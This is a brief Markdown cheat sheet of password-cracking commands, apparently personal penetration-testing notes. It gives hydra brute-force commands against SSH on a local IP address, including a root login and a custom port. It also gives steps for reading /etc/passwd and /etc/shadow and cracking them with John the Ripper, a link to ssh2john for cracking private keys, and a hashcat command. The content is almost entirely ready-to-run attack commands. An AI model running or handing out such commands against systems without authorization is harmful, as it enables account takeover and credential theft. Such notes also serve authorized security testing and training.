# Password Crack Methods

## SSH Bruteforce

```
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh

hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh -s 22022 //-s for different port

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh

```

## SSH john the crack to decrypt shadow password

```
1. Copy /etc/passwd content of a user in a text file
2. Copy /etc/shadow content of a user in a text file
3. sudo unshadow passwd.txt shadow.txt > hash.txt
4. sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## RSA Private Key crack using ssh2john

1. Link to download tool

https://github.com/koboi137/john/blob/bionic/ssh2john.py

2. Steps

https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/

## Hashcat command to crack password

```
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
```
